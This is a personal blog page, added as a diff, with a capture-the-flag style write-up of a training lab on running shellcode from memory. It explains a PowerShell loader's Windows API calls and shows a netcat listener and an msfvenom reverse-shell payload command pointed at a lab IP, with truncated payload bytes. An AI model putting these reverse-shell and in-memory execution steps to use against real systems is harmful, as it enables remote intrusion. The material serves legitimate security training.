@@ -1,0 +1,233 @@
+<!DOCTYPE HTML>
+<!--
+	Editorial by HTML5 UP
+	html5up.net | @ajlkn
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>CTRL_ALT_JOE</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="is-preload">
+
+		<!-- Wrapper -->
+			<div id="wrapper">
+
+				<!-- Main -->
+					<div id="main">
+						<div class="inner">
+
+							<!-- Header -->
+								<header id="header">
+									<a href="index.html" class="logo"><strong>CTRL_ALT_JOE</strong> <span style="font-size: smaller;"><i>1% Better every day</i></span></a>
+									<ul class="icons">
+										<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+										<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
+										<li><a href="#" class="icon brands fa-linkedin"><span class="label">fa-LinkedIn</span></a></li>
+										<li><a href="#" class="icon brands fa-medium-m"><span class="label">Medium</span></a></li>
+									</ul>
+								</header>
+
+							<!-- Content -->
+								<section>
+									<div style="position: relative; width: 100%; height: 0; padding-top: 56.2225%;
+									padding-bottom: 0; box-shadow: 0 2px 8px 0 rgba(63,69,81,0.16); margin-top: 1.6em; margin-bottom: 0.9em; overflow: hidden;
+									border-radius: 8px; will-change: transform;">  
+										<iframe loading="lazy" style="position: absolute; width: 100%; height: 100%; 
+										top: 0; left: 0; border: none; padding: 0;margin: 0;"
+										src="https://www.canva.com/design/DAGYwNTbH_M/OZwAdjZoChW99gmBJugu0Q/view?embed" allowfullscreen="allowfullscreen" allow="fullscreen">	
+										</iframe>
+									</div>
+<a href="https:&#x2F;&#x2F;www.canva.com&#x2F;design&#x2F;DAGYwNTbH_M&#x2F;OZwAdjZoChW99gmBJugu0Q&#x2F;view?utm_content=DAGYwNTbH_M&amp;utm_campaign=designshare&amp;utm_medium=embeds&amp;utm_source=link" target="_blank" rel="noopener">Black White Dark Futuristic Event Event Website</a> by ctrlalt joe
+
+									<h2>Music:</h2>
+
+									<iframe style="border-radius:12px" src="https://open.spotify.com/embed/playlist/0RIoqamtBKBODxjpU6xeJ1?utm_source=generator" width="100%" height="352" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>
+									*May not be for everyone and most were added from the DJ on Spotify
+									<br></br>
+									<body>
+										<h1>The Actual Shellcode<span style="font-size: smaller;"><i>Day8 - Advent of </i></span></h1>
+									
+										<p>We can execute this shellcode by loading it into memory and then creating a thread for its execution. In this case, we will use PowerShell to call a few Windows APIs via C# code. Below is a simple PowerShell script that will execute our shellcode:</p>
+									
+									
+										<p>Phew! That's a lot of code. But don't stress. We'll break down what it does step by step.</p>
+									
+										<h2>Explanation of the Code</h2>
+									
+										<p>The script starts by defining a few C# classes. These classes use the <code>DllImport</code> attribute to load specific functions from the <code>kernel32</code> DLL, which is part of the Windows API.</p>
+									
+										<ul>
+											<li><code>VirtualAlloc</code>: This function allocates memory in the process's address space. It's commonly used in scenarios like this to prepare memory for storing and executing shellcode.</li>
+											<li><code>CreateThread</code>: This function creates a new thread in the process. The thread will execute the shellcode that has been loaded into memory.</li>
+											<li><code>WaitForSingleObject</code>: This function pauses execution until a specific thread finishes its task. In this case, it ensures that the shellcode has completed execution.</li>
+										</ul>
+									
+										<p>These classes are then added to PowerShell using the <code>Add-Type</code> command, allowing PowerShell to use these functions.</p>
+									
+										<h3>Storing the Shellcode in a Byte Array</h3>
+									
+										<p>Next, the script stores the shellcode in the <code>$buf</code> variable, a byte array. In the example above, <code>SHELLCODE_PLACEHOLDER</code> is just there to show where you would insert the actual shellcode earlier generated through <code>msfvenom</code>. Usually, you'd replace it with the real shellcode, represented as a series of hexadecimal values. These hex values are the instructions that will be executed when the shellcode runs.</p>
+									
+										<h3>Allocating Memory for the Shellcode</h3>
+									
+										<p>The <code>VirtualAlloc</code> function then allocates a block of memory where the shellcode will be stored. The script uses the following arguments:</p>
+									
+										<ul>
+											<li><code>0</code> for the memory address, meaning that Windows will decide where to allocate the memory.</li>
+											<li><code>$size</code> for the size of the memory block, which is determined by the length of the shellcode.</li>
+											<li><code>0x3000</code> for the allocation type, which tells Windows to reserve and commit the memory.</li>
+											<li><code>0x40</code> for memory protection, the memory is readable and executable (necessary for executing shellcode).</li>
+										</ul>
+									
+										<p>After memory is allocated, the <code>Marshal.Copy</code> function copies the shellcode from the <code>$buf</code> array into the allocated memory address (<code>$addr</code>), preparing it for execution.</p>
+									
+										<h3>Executing the Shellcode and Waiting for Completion</h3>
+									
+										<p>Once the shellcode is stored in memory, the script calls the <code>CreateThread</code> function to execute the shellcode by creating a new thread. This thread is instructed to start execution from the memory address where the shellcode is located (<code>$addr</code>). The script then uses the <code>WaitForSingleObject</code> function, ensuring it waits for the shellcode execution to finish before continuing. This makes sure that the shellcode runs completely before the script ends its execution.</p>
+									
+										<hr>
+									
+										<h2>Where I Started?</h2>
+									
+										<p>I set up my environment on the AttackBox.</p>
+									
+										<h3>On the AttackBox: Setup a Listener</h3>
+									
+										<p>To catch the call back to the AttackBox from the Victim Machine:</p>
+									
+										<pre><code class="language-bash"># During the walk-through they show you how
+									# to do this on port 1111 change it to 4444
+									nc -nvpl [Port to Listen on]</code></pre>
+									
+										<img src="Pasted image 20241208131217.png" alt="Listener setup screenshot">
+									
+										<p>I used <code>tmux</code>: setup the command with the assigned IP that I was given.</p>
+									
+										<pre><code class="language-bash">root@ip-10-10-147-34:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.147.34 LPORT=1111 -f powershell</code></pre>
+									
+										<h3>Output:</h3>
+									
+										<pre><code class="language-bash">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+									[-] No arch selected, selecting arch: x64 from the payload
+									No encoder specified, outputting raw payload
+									Payload size: 460 bytes
+									Final size of powershell file: 2259 bytes
+									[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8...</code></pre>
+									
+										<p>Now we use the above PowerShell code to set up the memory space and add in the payload that we generated with <code>msfvenom</code>.</p>
+									
+										<p>After we run the code, we are able to get the reverse shell needed.</p>
+									
+										<p><strong>Keep in mind</strong> that the reverse shell needs to be triggered from port 4444, so you'll need to update that for the <code>msfvenom</code> command.</p>
+									
+										<p>This was a new take on creating a reverse shell from memory. I'll have to dig into this more to learn how to execute this remotely or look into possibilities to run as a low-level user!</p>
+										</body>
+								</section>
+
+						</div>
+					</div>
+
+				<!-- Sidebar -->
+					<div id="sidebar">
+						<div class="inner">
+
+							<!-- Search -->
+								<section id="search" class="alt">
+									<form method="post" action="#">
+										<input type="text" name="query" id="query" placeholder="Search" />
+									</form>
+								</section>
+
+							<!-- Menu -->
+								<nav id="menu">
+									<header class="major">
+										<h2>Menu</h2>
+									</header>
+									<ul>
+										<li><a href="index.html">Homepage</a></li>
+										<li><a href="aoc.html">Advent of Cyber 2024</a></li>
+										<li>
+											<span class="opener">HackTheBox</span>
+											<ul>
+												<li><a href="#">Box 1</a></li>
+												<li><a href="#">Box 2</a></li>
+												<li><a href="#">Box 3</a></li>
+												<li><a href="#">Box 4</a></li>
+											</ul>
+										</li>
+										<li><a href="#">Etiam Dolore</a></li>
+										<li><a href="#">Adipiscing</a></li>
+										<li>
+											<span class="opener">TryHackMe</span>
+											<ul>
+												<li><a href="#">Lorem Dolor</a></li>
+												<li><a href="#">Ipsum Adipiscing</a></li>
+												<li><a href="#">Tempus Magna</a></li>
+												<li><a href="#">SkyNet</a></li>
+											</ul>
+										</li>
+										<li><a href="elements.html">Elements</a></li>
+									</ul>
+								</nav>
+
+							<!-- Section -->
+								<section>
+									<header class="major">
+										<h2>Ante interdum</h2>
+									</header>
+									<div class="mini-posts">
+										<article>
+											<a href="#" class="image"><img src="images/pic07.jpg" alt="" /></a>
+											<p>Aenean ornare velit lacus, ac varius enim lorem ullamcorper dolore aliquam.</p>
+										</article>
+										<article>
+											<a href="#" class="image"><img src="images/pic08.jpg" alt="" /></a>
+											<p>Aenean ornare velit lacus, ac varius enim lorem ullamcorper dolore aliquam.</p>
+										</article>
+										<article>
+											<a href="#" class="image"><img src="images/pic09.jpg" alt="" /></a>
+											<p>Aenean ornare velit lacus, ac varius enim lorem ullamcorper dolore aliquam.</p>
+										</article>
+									</div>
+									<ul class="actions">
+										<li><a href="#" class="button">More</a></li>
+									</ul>
+								</section>
+
+							<!-- Section -->
+								<section>
+									<header class="major">
+										<h2>Get in touch</h2>
+									</header>
+									<p>Sed varius enim lorem ullamcorper dolore aliquam aenean ornare velit lacus, ac varius enim lorem ullamcorper dolore. Proin sed aliquam facilisis ante interdum. Sed nulla amet lorem feugiat tempus aliquam.</p>
+									<ul class="contact">
+										<li class="icon solid fa-envelope"><a href="#">information@untitled.tld</a></li>
+										<li class="icon solid fa-phone">(000) 000-0000</li>
+										<li class="icon solid fa-home">1234 Somewhere Road #8254<br />
+										Nashville, TN 00000-0000</li>
+									</ul>
+								</section>
+
+							<!-- Footer -->
+								<footer id="footer">
+									<p class="copyright">&copy; Untitled. All rights reserved. Demo Images: <a href="https://unsplash.com">Unsplash</a>. Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+								</footer>
+
+						</div>
+					</div>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
